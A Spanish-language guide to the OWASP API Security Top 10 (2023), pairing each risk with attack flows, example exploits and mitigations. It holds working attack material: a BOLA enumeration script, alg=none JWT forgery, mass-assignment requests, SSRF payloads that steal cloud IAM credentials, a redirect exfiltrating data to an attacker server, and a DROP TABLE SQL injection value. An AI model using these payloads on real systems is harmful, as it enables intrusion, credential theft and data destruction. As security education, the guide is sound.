01

Broken Object Level Authorization

API1:2023 — BOLA
SEVERIDAD: CRÍTICA EXPLOTABILIDAD: FÁCIL PREVALENCIA: ~40% DE ATAQUES API

⚡ Descripción Técnica

La vulnerabilidad BOLA (Broken Object Level Authorization) se produce cuando una API expone endpoints que manejan identificadores de objetos sin implementar verificaciones adecuadas de autorización a nivel de objeto. El servidor no valida que el usuario autenticado tenga permisos legítimos para acceder al recurso solicitado, confiando únicamente en el identificador proporcionado por el cliente.

En arquitecturas RESTful, los recursos se identifican mediante IDs en la URL (e.g., /api/v1/users/{id}/orders). Si la API no verifica la relación entre el usuario autenticado y el objeto referenciado, un atacante puede enumerar y acceder a recursos de otros usuarios simplemente manipulando dichos identificadores.

🎯 Vectores de Ataque

  • Manipulación directa de IDs secuenciales en endpoints REST (IDOR)
  • Enumeración masiva de recursos mediante scripts automatizados
  • Modificación de parámetros en peticiones GraphQL (e.g., reportKeys)
  • Alteración de identificadores en cookies, headers o body de la petición
  • Explotación de flujos de restablecimiento de contraseña para account takeover
  • Acceso a datos de otros usuarios en aplicaciones multi-tenant

▸ Flujo de Ataque BOLA — Secuencia Paso a Paso

1
Atacante se autentica con credenciales legítimas
→
2
Observa petición: GET /api/users/123/data
→
3
Modifica ID del objeto: GET /api/users/124/data
→
4
API no valida propiedad del recurso
→
5
Servidor retorna datos del usuario víctima (200 OK)
→
6
Exfiltración masiva mediante enumeración automatizada

💻 Ejemplo de Explotación

exploit_bola.py — Enumeración BOLA automatizada
# Escenario: E-commerce con endpoint vulnerable
# El atacante enumera datos de revenue de todas las tiendas

import requests

base_url = "https://api.target.com/shops/{shop}/revenue_data.json"
token = "Bearer eyJhbGciOiJIUzI1NiIs..."  # Token legítimo del atacante
headers = {"Authorization": token}

# 1. Obtener lista de tiendas (endpoint público)
shops = requests.get("https://api.target.com/shops/list", headers=headers).json()

# 2. Iterar sobre cada tienda — sin verificación de autorización
for shop in shops:
    r = requests.get(base_url.format(shop=shop["name"]), headers=headers)
    if r.status_code == 200:
        print(f"[BOLA] Revenue de {shop['name']}: {r.json()['total']}")
request_legítima.http vs request_maliciosa.http
# ── Petición LEGÍTIMA (usuario 207939055) ──

# ── Petición MALICIOSA (BOLA) ──

Cookie: session=eyJ1c2VySWQiOjIwNzkzOTA1NX0=
# userId en query ≠ userId en cookie ✘ → API retorna datos ajenos

La explotación de BOLA puede derivar en exfiltración masiva de datos, toma de control de cuentas (account takeover), eliminación no autorizada de registros y escalada de privilegios horizontal. En 2019, una vulnerabilidad BOLA en Uber habría permitido a un atacante tomar el control de cualquier cuenta de usuario.

🛡️ Mitigaciones

✓ Authorization Check

Implementar verificación de autorización a nivel de objeto en cada función que acceda a datos mediante un ID proporcionado por el usuario.

✓ UUIDs

Utilizar identificadores no secuenciales e impredecibles (UUIDs v4) en lugar de IDs auto-incrementales.

✓ RBAC + ABAC

Aplicar control de acceso basado en roles (RBAC) combinado con control basado en atributos (ABAC) para validar ownership.

✓ Testing

Realizar pruebas de autorización automatizadas con herramientas como Burp Suite Intruder, verificando respuestas 403/401 ante IDs no autorizados.

02

Broken Authentication

API2:2023
SEVERIDAD: CRÍTICA EXPLOTABILIDAD: FÁCIL

⚡ Descripción Técnica

Los mecanismos de autenticación en APIs frecuentemente se implementan de forma incorrecta, lo que permite a un atacante comprometer tokens de autenticación o explotar fallas de implementación para suplantar la identidad de otros usuarios de forma temporal o permanente. A diferencia de las aplicaciones web tradicionales donde la autenticación se gestiona mediante sesiones con cookies, las APIs suelen depender de tokens (JWT, OAuth 2.0, API Keys) cuya implementación errónea abre múltiples vectores de ataque.

Si un sistema pierde la capacidad de identificar correctamente al cliente o usuario, la seguridad completa de la API queda comprometida, dado que la autorización depende directamente de una autenticación confiable.

🎯 Vectores de Ataque

  • Credential stuffing con listas de credenciales filtradas
  • Fuerza bruta contra endpoints de login sin rate limiting
  • Manipulación de JWT: modificar payload sin verificar firma (alg=none)
  • Robo de tokens mediante ataques XSS o insecure storage
  • Reutilización de tokens expirados o revocados (falta de invalidación)
  • Enumeración de usuarios vía mensajes de error diferenciados
  • Bypass de MFA mediante race conditions o flujos alternativos

▸ Flujo de Ataque — JWT Algorithm Confusion

1
Atacante obtiene JWT legítimo de su sesión
→
2
Decodifica payload Base64 (sub, role, exp)
→
3
Cambia "alg":"RS256" por "alg":"none"
→
4
Modifica "role":"user" a "role":"admin"
→
5
Envía JWT forjado sin firma al servidor
→
6
Servidor acepta token → privilegios de admin

💻 Ejemplo de Explotación — JWT Manipulation

jwt_attack.sh — Manipulación de token JWT
# Token JWT original (3 partes separadas por ".")
TOKEN="eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIifQ.signature"

# 1. Decodificar header
echo "eyJhbGciOiJSUzI1NiJ9" | base64 -d
# Output: {"alg":"RS256"}

# 2. Forjar header con alg=none
NEW_HEADER=$(echo -n '{"alg":"none"}' | base64 | tr -d '=')

# 3. Forjar payload con rol de admin
NEW_PAYLOAD=$(echo -n '{"sub":"user123","role":"admin"}' | base64 | tr -d '=')

# 4. Construir JWT malicioso (sin firma)
FORGED_JWT="${NEW_HEADER}.${NEW_PAYLOAD}."

# 5. Enviar petición con token forjado
curl -H "Authorization: Bearer ${FORGED_JWT}" \
     https://api.target.com/admin/users
# ⚠ Acceso administrativo concedido

💀 Impacto

Confidencialidad
9.5
Integridad
9.0
Disponibilidad
6.0

La autenticación rota permite la suplantación total de identidad, acceso no autorizado a datos sensibles, y puede comprometer la seguridad de toda la plataforma. Ataques como credential stuffing pueden afectar a miles de cuentas simultáneamente.

🛡️ Mitigaciones

✓ Rate Limiting

Implementar limitación de tasa y bloqueo progresivo de cuentas en endpoints de autenticación.

✓ JWT Hardening

Forzar algoritmos específicos (RS256/ES256), validar firma, expiración y claims en servidor.

✓ MFA

Implementar autenticación multifactor obligatoria para operaciones sensibles.

✓ Credential Hashing

Almacenar credenciales con bcrypt/scrypt/Argon2. No revelar si el usuario o contraseña es incorrecta.

03

Broken Object Property Level Authorization

API3:2023 — BOPLA
SEVERIDAD: ALTA EXPLOTABILIDAD: MEDIA FUSIONA: API3:2019 + API6:2019

⚡ Descripción Técnica

Esta categoría unifica dos vulnerabilidades previas: Excessive Data Exposure (API3:2019) y Mass Assignment (API6:2019), enfocándose en la causa raíz compartida: la ausencia o implementación inadecuada de validación de autorización a nivel de propiedades del objeto.

Excessive Data Exposure: La API retorna más propiedades del objeto de las que el usuario debería ver, delegando el filtrado al frontend. Un atacante puede interceptar la respuesta y acceder a campos sensibles.

Mass Assignment: La API permite que el cliente modifique propiedades del objeto que no deberían ser editables (e.g., role, isAdmin, balance).

🎯 Vectores de Ataque

  • Exposure: Interceptar respuestas API para extraer campos ocultos (SSN, email, password hash)
  • Exposure: Analizar respuestas GraphQL introspection para descubrir campos sensibles
  • Assignment: Inyectar propiedades adicionales en PUT/PATCH (e.g., "role":"admin")
  • Assignment: Manipular campos hidden en objetos JSON de actualización de perfil
  • Fuzzing de propiedades con wordlists para descubrir campos internos

▸ Flujo de Ataque — Mass Assignment + Excessive Data Exposure

1
GET /api/user/profile retorna campos ocultos en JSON
→
2
Atacante identifica: "role":"user", "credit":0
→
3
PUT /api/user/profile con "role":"admin","credit":99999
→
4
API procesa TODOS los campos sin whitelist
→
5
Escalada de privilegios + manipulación financiera

💻 Ejemplo de Explotación

mass_assignment_exploit.http
# ── Respuesta original con datos excesivos (Excessive Data Exposure) ──
GET /api/v2/users/me HTTP/1.1
Authorization: Bearer eyJ...

# Response 200 OK:
{
  "id": 1024,
  "name": "john_doe",
  "email": "john@example.com",
  "role": "user",             ← Campo interno expuesto
  "credit_balance": 50.00,    ← Campo sensible expuesto
  "is_admin": false,          ← Flag interno expuesto
  "password_hash": "$2b$12..." ← ¡HASH EXPUESTO!
}

# ── Ataque Mass Assignment ──
PUT /api/v2/users/me HTTP/1.1
Content-Type: application/json
Authorization: Bearer eyJ...

{
  "name": "john_doe",
  "role": "admin",
  "credit_balance": 999999.00,
  "is_admin": true
}

💀 Impacto

Confidencialidad
9.0
Integridad
9.0

La exposición excesiva de datos permite la recolección de información sensible (PII, hashes, tokens internos), mientras que Mass Assignment posibilita la escalada de privilegios y la manipulación de datos financieros o administrativos.

🛡️ Mitigaciones

✓ Response Filtering

Nunca delegar el filtrado al cliente. Implementar DTOs (Data Transfer Objects) específicos por rol.

✓ Allowlist de Propiedades

Definir explícitamente qué campos son modificables por el usuario en cada endpoint (whitelist).

✓ Schema Validation

Validar estructura de entrada contra un esquema estricto (JSON Schema) antes del procesamiento.

✓ Field-Level ACL

Implementar control de acceso granular a nivel de campo/propiedad para lectura y escritura.

04

Unrestricted Resource Consumption

API4:2023
SEVERIDAD: ALTA EXPLOTABILIDAD: MEDIA ANTES: Lack of Resources & Rate Limiting

⚡ Descripción Técnica

Las peticiones a APIs consumen recursos del servidor: ancho de banda, CPU, memoria y almacenamiento. Adicionalmente, servicios integrados como envío de SMS, emails, validación biométrica o llamadas telefónicas se pagan por uso. La ausencia de límites adecuados permite a los atacantes agotar estos recursos, provocando denegación de servicio (DoS) o un incremento descontrolado de costes operativos.

Esta categoría amplía el alcance de la anterior "Lack of Resources & Rate Limiting" (API4:2019), incluyendo no solo rate limiting sino también límites en tamaño de uploads, paginación, timeouts de ejecución y gastos en servicios de terceros.

🎯 Vectores de Ataque

  • Solicitudes masivas sin rate limiting → agotamiento de CPU/memoria
  • Upload de archivos sin límite de tamaño → agotamiento de almacenamiento
  • Parámetro page_size=1000000 en paginación sin máximo
  • Abuso de SMS/Email OTP → costes de proveedor descontrolados
  • Peticiones que disparan procesamiento intensivo (regex, queries complejas)
  • Envío de payloads extremadamente grandes en body (e.g., JSON de 50MB)

▸ Flujo de Ataque — Resource Exhaustion

1
Atacante identifica endpoint sin rate limit
→
2
Envía 10,000 req/s con page_size=999999
→
3
Servidor asigna memoria masiva por petición
→
4
OOM Kill / Timeout → servicio caído para todos los usuarios

💻 Ejemplo — Código Vulnerable vs Seguro

vulnerable_endpoint.py vs secure_endpoint.py
# ── VULNERABLE: Sin límite de paginación ──
@app.get("/api/products")
def list_products(page_size: int = 20):
    return db.query(Product).limit(page_size).all()
    # ⚠ Atacante puede enviar page_size=1000000

# ── SEGURO: Con validación de límites ──
@app.get("/api/products")
def list_products(page_size: int = Query(default=20, le=100)):
    return db.query(Product).limit(page_size).all()
    # ✔ Máximo 100 registros por página

🛡️ Mitigaciones

✓ Rate Limiting

Implementar rate limiting granular por usuario, IP y endpoint con algoritmos como Token Bucket o Sliding Window.

✓ Input Limits

Establecer límites máximos para: tamaño de body, page_size, file uploads, timeouts de ejecución.

✓ Spending Limits

Configurar alertas y límites de gasto en servicios de terceros (SMS, email, APIs externas).

✓ Throttling

Implementar throttling progresivo y circuit breakers para proteger contra picos de tráfico.

💀 Impacto

Disponibilidad
9.5
Impacto Financiero
8.0

Un caso notable involucró a Dell, donde la ausencia de rate limiting permitió la extracción de 49 millones de registros de clientes mediante solicitudes masivas automatizadas.

05

Broken Function Level Authorization

API5:2023 — BFLA
SEVERIDAD: CRÍTICA EXPLOTABILIDAD: FÁCIL

⚡ Descripción Técnica

BFLA (Broken Function Level Authorization) se manifiesta cuando las políticas de control de acceso con diferentes jerarquías, grupos y roles se implementan de forma inadecuada, sin una separación clara entre funciones administrativas y regulares. A diferencia de BOLA (que opera a nivel de objetos), BFLA permite a un atacante acceder a funciones completas a las que no debería tener permiso, como endpoints administrativos, operaciones de eliminación masiva o funciones de gestión de usuarios.

🎯 Vectores de Ataque

  • Acceso a endpoints admin cambiando /api/users por /api/admin/users
  • Cambio de método HTTP: si GET está permitido, probar DELETE/PUT sin autorización
  • Enumeración de rutas administrativas mediante fuzzing de directorios
  • Explotación de middleware que verifica rol en GET pero no en POST/DELETE
  • Manipulación de headers X-Original-URL o X-Rewrite-URL para bypass de ACL

▸ Flujo de Ataque — BFLA Privilege Escalation

1
Usuario regular autenticado con rol "user"
→
2
Descubre endpoint: DELETE /api/admin/users/{id}
→
3
Envía petición DELETE con su token de usuario regular
→
4
API no verifica si el rol tiene permiso para DELETE
→
5
Cuenta objetivo eliminada — escalada vertical exitosa

💻 Ejemplo de Explotación

bfla_exploit.http — Bypass de autorización funcional
# ── Petición legítima de usuario regular ──
GET /api/users/1024 HTTP/1.1
Authorization: Bearer eyJ...[role=user]
# → 200 OK (permitido)

# ── Intento de acceso a función administrativa ──
DELETE /api/admin/users/1025 HTTP/1.1
Authorization: Bearer eyJ...[role=user]
# → 200 OK — ¡El middleware no verificó el rol para DELETE!

# ── Variante: Cambio de método HTTP ──
GET  /api/users/1024 → 200 OK (verificado)
POST /api/users/1024/promote → 200 OK (NO verificado)
PUT  /api/users/1024 {"role":"admin"} → 200 OK (NO verificado)

🛡️ Mitigaciones

✓ Deny by Default

Implementar política de denegación por defecto: todo endpoint requiere autorización explícita.

✓ Per-Method Auth

Verificar autorización para cada método HTTP (GET, POST, PUT, DELETE, PATCH) de forma independiente.

✓ Audit Periódico

Realizar auditorías regulares de endpoints comparando accesos con los roles definidos en la matriz RBAC.

✓ API Gateway

Centralizar el enforcement de autorización en un API Gateway con políticas declarativas.

💀 Impacto

Confidencialidad
9.0
Integridad
9.5

Un atacante puede crear, modificar o eliminar usuarios, modificar roles, acceder a funciones administrativas y comprometer la integridad total del sistema. La escalada de privilegios vertical es el riesgo principal.

06

Unrestricted Access to Sensitive Business Flows

API6:2023 — NUEVA
SEVERIDAD: ALTA EXPLOTABILIDAD: FÁCIL CATEGORÍA NUEVA EN 2023

⚡ Descripción Técnica

Esta categoría, nueva en la edición 2023, aborda las APIs que exponen flujos de negocio — como comprar un ticket, publicar un comentario o registrar una referencia — sin compensar cómo dicha funcionalidad podría dañar al negocio si se utiliza excesivamente de forma automatizada. No se trata necesariamente de un error de implementación, sino de una falta de controles anti-abuso sobre la lógica de negocio.

El atacante necesita comprender la lógica de negocio detrás de la API para identificar flujos sensibles y automatizar su explotación a escala, causando pérdidas económicas, ventajas competitivas ilegítimas o degradación del servicio.

🎯 Vectores de Ataque

  • Automatización masiva de compras de tickets (scalping)
  • Abuso de programas de referidos: scripts que registran miles de usuarios falsos para acumular créditos
  • Spam automatizado de comentarios, reseñas o publicaciones
  • Explotación de cupones o descuentos mediante manipulación de workflow
  • Scraping masivo de contenido mediante acceso API no restringido
  • Manipulación de carritos de compra y flujos de pago

▸ Flujo de Ataque — Referral Program Abuse

1
Atacante analiza API de programa de referidos
→
2
Crea script que registra cuentas falsas automáticamente
→
3
Cada cuenta se registra con el link de referido del atacante
→
4
Crédito acumulado en wallet del atacante por cada referido
→
5
Atacante convierte créditos en servicios gratuitos o efectivo

🛡️ Mitigaciones

✓ Device Fingerprinting

Implementar fingerprinting por dispositivo para identificar y bloquear clientes automatizados (headless browsers).

✓ CAPTCHA Adaptativo

Desplegar CAPTCHA y detección biométrica en flujos de negocio sensibles.

✓ Business Logic Rules

Implementar validaciones stateful: cupones de un solo uso, límites de referidos, transiciones de estado válidas.

✓ Behavior Analysis

Monitorización en tiempo real de patrones de uso anómalos: velocidad, volumen y patrones de navegación sospechosos.

💀 Impacto

Impacto al Negocio
9.0
Impacto Financiero
8.5

Los ataques de abuso de lógica de negocio pueden generar pérdidas económicas directas, degradación de la experiencia de usuario legítimo, y erosión de la confianza en la plataforma.

07

Server Side Request Forgery

API7:2023 — SSRF
SEVERIDAD: ALTA EXPLOTABILIDAD: MEDIA NUEVA EN API TOP 10

⚡ Descripción Técnica

SSRF (Server-Side Request Forgery) ocurre cuando una API recupera un recurso remoto sin validar la URI proporcionada por el usuario. El atacante puede forzar a la aplicación a enviar peticiones crafteadas hacia destinos inesperados, incluso estando protegida por firewalls o VPNs. Las APIs son particularmente vulnerables a SSRF debido a su dependencia de tecnologías modernas como Kubernetes y Docker, que se comunican mediante protocolos basados en API HTTP.

Funcionalidades como webhooks, integraciones SSO, carga de imágenes por URL, y redirecciones de archivos constituyen los vectores clásicos de SSRF en APIs.

🎯 Vectores de Ataque

  • Acceso a metadata de cloud: http://169.254.169.254/latest/meta-data/
  • Escaneo de puertos internos mediante URL controlada por atacante
  • Acceso a servicios internos (Redis, Elasticsearch, bases de datos)
  • Exfiltración de credenciales IAM/Security Credentials de AWS/GCP/Azure
  • Pivoting hacia redes internas a través de peticiones HTTP desde el servidor
  • Exploiting de webhooks para entregar payloads a sistemas internos

▸ Flujo de Ataque — SSRF to Cloud Credential Theft

1
API acepta URL de imagen de perfil del usuario
→
2
Atacante envía: http://169.254.169.254/iam/credentials
→
3
Servidor fetch URL internamente (server-side)
→
4
AWS Metadata Service retorna credenciales IAM
→
5
API retorna respuesta → credenciales expuestas al atacante

💻 Ejemplo de Explotación

ssrf_exploit.http — SSRF via Profile Picture + GraphQL Webhook
# ── Escenario 1: Upload de imagen de perfil ──
POST /api/profile/upload_picture HTTP/1.1
Content-Type: application/json

{
  "picture_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-ssm"
}
# → Servidor retorna credenciales IAM del EC2 instance role

# ── Escenario 2: Webhook Notification via GraphQL ──
POST /graphql HTTP/1.1
Content-Type: application/json

{
  "query": "mutation { createNotificationChannel(input: {
    channelName: \"exfil_channel\",
    notificationChannelConfig: {
      customWebhookChannelConfigs: [{
        url: \"http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-ssm\",
        send_test_req: true
      }]
    }
  }) { channelId } }"
}
# → Test request expone credenciales cloud en la respuesta

# ── Escenario 3: Port Scanning interno ──
POST /api/profile/upload_picture HTTP/1.1
{"picture_url": "http://10.0.0.1:6379/"}
# Response time ~50ms = puerto abierto (Redis)
{"picture_url": "http://10.0.0.1:3306/"}
# Response time ~5000ms = puerto cerrado/filtrado

🛡️ Mitigaciones

✓ URL Allowlisting

Validar URLs contra una allowlist de dominios y esquemas permitidos. Bloquear IPs privadas, loopback y link-local.

✓ Disable Redirects

Deshabilitar seguimiento automático de redirecciones HTTP en las bibliotecas de fetch del servidor.

✓ Network Segmentation

Aislar los mecanismos de fetch de recursos en una red separada, limitando el acceso a servicios internos.

✓ IMDSv2

En AWS, migrar a Instance Metadata Service v2 (IMDSv2) que requiere token de sesión para acceder a metadata.

💀 Impacto

Confidencialidad
9.5
Lateral Movement
8.5

La brecha de Capital One en 2019 se originó a partir de una vulnerabilidad SSRF que expuso credenciales AWS, resultando en la exposición de datos de más de 100 millones de clientes, incluyendo números de seguridad social y cuentas bancarias.

08

Security Misconfiguration

API8:2023
SEVERIDAD: ALTA EXPLOTABILIDAD: FÁCIL

⚡ Descripción Técnica

Las APIs y los sistemas que las soportan típicamente contienen configuraciones complejas destinadas a hacerlas más personalizables. Los ingenieros de software y DevOps pueden omitir estas configuraciones o no seguir las mejores prácticas de seguridad, abriendo la puerta a diversos tipos de ataques. Esta categoría funciona como un "catch-all" que engloba desde CORS permisivos hasta mensajes de error verbosos, métodos HTTP innecesarios habilitados y documentación Swagger expuesta en producción.

🎯 Vectores de Ataque

  • CORS mal configurado: Access-Control-Allow-Origin: * con credenciales
  • Stack traces y mensajes de error detallados expuestos en producción
  • Métodos HTTP innecesarios habilitados (TRACE, OPTIONS con info sensible)
  • Documentación OpenAPI/Swagger expuesta sin autenticación en producción
  • TLS/SSL obsoleto o mal configurado (ciphers débiles, certificados vencidos)
  • Headers de seguridad ausentes (HSTS, X-Content-Type-Options, CSP)
  • Credenciales por defecto en servicios de infraestructura

💻 Ejemplo — Misconfigurations Comunes

misconfig_examples.http
# ── CORS Permisivo (permite cualquier origen con cookies) ──
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
# ⚠ Cualquier sitio malicioso puede hacer peticiones autenticadas

# ── Error verbose que filtra información interna ──
GET /api/users/abc → 500 Internal Server Error
{
  "error": "PostgreSQL error: relation 'users_v2' does not exist at /app/models/user.py:47",
  "stack": "Traceback... File /app/middleware/auth.py, line 23..."
}
# ⚠ Expone: DB engine, estructura de tablas, rutas internas, versión de framework

# ── Swagger/OpenAPI en producción sin auth ──
GET https://api.target.com/swagger-ui/ → 200 OK
# ⚠ Mapa completo de todos los endpoints, parámetros y schemas

🛡️ Mitigaciones

✓ Security Hardening

Aplicar hardening en todos los niveles: servidor, framework, API gateway, base de datos. Eliminar defaults.

✓ CORS Restrictivo

Configurar Access-Control-Allow-Origin con dominios específicos. Nunca usar wildcard con credenciales.

✓ Error Handling

Mensajes de error genéricos en producción. Logs detallados solo en backend, nunca en respuestas.

✓ IaC Security

Automatizar configuraciones seguras mediante Infrastructure as Code (Terraform, Ansible) con validación pre-deploy.

💀 Impacto

Superficie Ataque

Info Disclosure
8.5

Las misconfiguraciones proporcionan a los atacantes un mapa completo de la arquitectura interna, facilitando la planificación y ejecución de ataques más sofisticados. Una documentación Swagger expuesta equivale a entregar un manual de explotación.

09

Improper Inventory Management

API9:2023
SEVERIDAD: ALTA EXPLOTABILIDAD: FÁCIL

⚡ Descripción Técnica

Las APIs tienden a exponer más endpoints que las aplicaciones web tradicionales, lo que hace que una documentación adecuada y actualizada sea fundamental. Un inventario apropiado de hosts y versiones de API desplegadas es crítico para mitigar problemas como versiones deprecadas, endpoints de debug expuestos y "shadow APIs" — endpoints que existen pero no están documentados, monitorizados ni mantenidos.

Las versiones antiguas de APIs (v1, v2) frecuentemente carecen de los controles de seguridad implementados en versiones más recientes, convirtiéndose en puntos de entrada privilegiados para los atacantes.

🎯 Vectores de Ataque

  • Descubrimiento de versiones antiguas: /api/v1/ con menos controles que /api/v3/
  • Shadow APIs: endpoints no documentados accesibles en producción
  • Endpoints de debug/staging expuestos en producción
  • APIs internas accesibles desde la red externa sin autenticación
  • Servicios microservicio olvidados con vulnerabilidades conocidas
  • Enumeración de endpoints mediante fuzzing de directorios y métodos

▸ Flujo de Ataque — Shadow API Discovery

1
Atacante detecta /api/v3/ es la versión actual
→
2
Prueba /api/v1/ y /api/v2/ → ambas responden 200
→
3
/api/v1/ no tiene rate limiting ni MFA
→
4
Brute-force de credenciales exitoso contra v1
→
5
Token de v1 válido en v3 → acceso completo al sistema

🛡️ Mitigaciones

✓ API Inventory

Mantener un inventario centralizado y actualizado de todas las APIs, versiones, hosts y entornos.

✓ API Gateway

Enrutar todo el tráfico API a través de un gateway centralizado que registre y controle los endpoints activos.

✓ Deprecation Policy

Implementar política de deprecación con fechas límite, y desactivar versiones antiguas automáticamente.

✓ Runtime Discovery

Utilizar herramientas de descubrimiento de APIs en runtime para detectar shadow APIs y endpoints no documentados.

💀 Impacto

Superficie Ataque
9.5
Evasión de Controles
8.5

Las shadow APIs y versiones deprecadas representan puntos ciegos en la postura de seguridad de una organización. Los controles de seguridad modernos pueden ser completamente evadidos accediendo a versiones antiguas sin protección.

10

Unsafe Consumption of APIs

API10:2023 — NUEVA
SEVERIDAD: ALTA EXPLOTABILIDAD: MEDIA CATEGORÍA NUEVA EN 2023

⚡ Descripción Técnica

Los desarrolladores tienden a confiar más en los datos recibidos de APIs de terceros que en el input de usuarios, adoptando estándares de seguridad más débiles para los datos provenientes de integraciones externas. Para comprometer una API objetivo, los atacantes pueden optar por comprometer primero los servicios integrados de terceros en lugar de atacar directamente la API objetivo — un enfoque de supply chain attack.

Si una API consume datos de un servicio de terceros sin validarlos adecuadamente, un atacante que comprometa dicho servicio puede inyectar payloads maliciosos que afecten a todos los consumidores downstream, incluyendo SQLi, SSRF, o redirect chains.

🎯 Vectores de Ataque

  • Compromiso de API de terceros para inyectar SQLi payload en datos de negocio
  • Redirect poisoning: servicio de terceros comprometido retorna 308 redirect a servidor atacante
  • Inyección de payloads maliciosos en nombres de repositorios Git integrados
  • Data poisoning a través de servicios de enriquecimiento de datos comprometidos
  • Supply chain: comprometer dependencias NPM/PyPI usadas por la API
  • Exfiltración de datos sensibles mediante redirect de servicios integrados

▸ Flujo de Ataque — Supply Chain via Third-Party API

1
Atacante compromete API de terceros (geocoding service)
→
2
Almacena SQLi payload en campo "business_name"
→
3
API objetivo consulta servicio de terceros para enriquecer datos
→
4
Dato malicioso insertado directamente en query SQL sin sanitizar
→
5
SQLi ejecutado → exfiltración de datos a servidor del atacante

💻 Ejemplo de Explotación — Redirect Poisoning

supply_chain_ssrf.http — Third-Party API Compromise
# ── API legítima envía datos médicos al proveedor de almacenamiento ──
POST /user/store_phr_record HTTP/1.1
Content-Type: application/json

{
  "genome": "ACTAGTAG__TTGADDAAIICCTT..."
}

# ── Proveedor COMPROMETIDO responde con redirect malicioso ──
HTTP/1.1 308 Permanent Redirect
Location: https://attacker-controlled-server.com/

# → La API sigue el redirect CIEGAMENTE, reenviando datos genómicos
#    sensibles del paciente al servidor del atacante

# ── Otro ejemplo: SQLi via nombre de repositorio Git ──
# Atacante crea repositorio con nombre malicioso:
repo_name = "'; DROP TABLE users;--"

# Cuando la API integra el repositorio:
query = f"INSERT INTO repos (name) VALUES ('{repo_name}')"
# → SQL Injection ejecutada porque la API confía en datos del tercero

🛡️ Mitigaciones

✓ Zero Trust on Input

Tratar datos de APIs de terceros con el mismo nivel de desconfianza que el input de usuarios finales. Validar y sanitizar todo.

✓ Disable Redirects

Deshabilitar seguimiento automático de redirecciones HTTP al consumir APIs externas.

✓ SCA + SBOM

Implementar análisis de composición de software (SCA) y mantener un SBOM actualizado de todas las dependencias.

✓ mTLS + Cert Pinning

Utilizar TLS certificate pinning y mTLS para verificar la identidad del servidor y prevenir interceptaciones.

💀 Impacto

Supply Chain Risk
9.0
Data Breach
8.5

Los ataques de cadena de suministro representan una amenaza creciente. Al comprometer un solo servicio de terceros, un atacante puede afectar a todos sus consumidores downstream, multiplicando exponencialmente el impacto de la brecha.
